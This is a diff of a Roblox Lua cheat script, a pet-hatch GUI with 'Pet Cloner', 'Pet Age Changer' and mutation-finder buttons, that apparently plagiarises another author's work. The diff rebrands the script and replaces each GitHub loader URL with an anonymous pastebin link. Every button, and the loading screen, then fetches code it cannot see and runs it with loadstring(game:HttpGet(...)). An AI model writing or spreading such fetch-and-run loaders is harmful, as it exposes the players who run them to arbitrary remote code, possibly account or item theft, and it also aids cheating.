@@ -9,7 +9,7 @@
 -- SKIDDED BY SIGMA @rizzify101
 -- SKIDDED BY SIGMA @rizzify101
 
--- ⛏ Kuni VIP Pet Hatch GUI (Dark Theme with White Buttons)
+-- ⛏ Nex VIP Pet Hatch GUI (Dark Theme with White Buttons)
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
@@ -19,7 +19,7 @@ local player = Players.LocalPlayer
 local mouse = player:GetMouse()
 
 -- ✅ Loading Screen
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/loadingscreen1"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/4VDFUhyp"))()
 wait(5)
 
 local espEnabled = true
@@ -277,24 +277,24 @@ end)
 
 local loadAgeBtn = createButton("Open Pet Age Changer", 144)
 loadAgeBtn.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/PetAgeChanger"))()
+	loadstring(game:HttpGet("https://pastebin.com/raw/ff6gT8Nm"))()
 end)
 
 local mutationBtn = createButton("Open Pet Mutation Finder", 180)
 mutationBtn.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/Mt"))()
+	loadstring(game:HttpGet("https://pastebin.com/raw/Rwg6Nbpg"))()
 end)
 
 local duplicateBtn = createButton("Open Pet Cloner", 216)
 duplicateBtn.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/petduplicator"))()
+	loadstring(game:HttpGet("https://pastebin.com/raw/GpGjBe10"))()
 end)
 
 local credit = Instance.new("TextLabel", frame)
 credit.Size = UDim2.new(1, 0, 0, 18)
 credit.Position = UDim2.new(0, 0, 0, 260)
 credit.BackgroundTransparency = 1
-credit.Text = "Tiktok: @yawiyawiyawiz1"
+credit.Text = "Tiktok: @nexscript0"
 credit.Font = Enum.Font.FredokaOne
 credit.TextSize = 12
 credit.TextColor3 = Color3.fromRGB(180, 180, 180)
@@ -378,3 +378,4 @@ miniBtn.MouseButton1Click:Connect(toggleMinimize)
 -- SKIDDED BY SIGMA @rizzify101
 -- SKIDDED BY SIGMA @rizzify101
 -- SKIDDED BY SIGMA @rizzify101
+
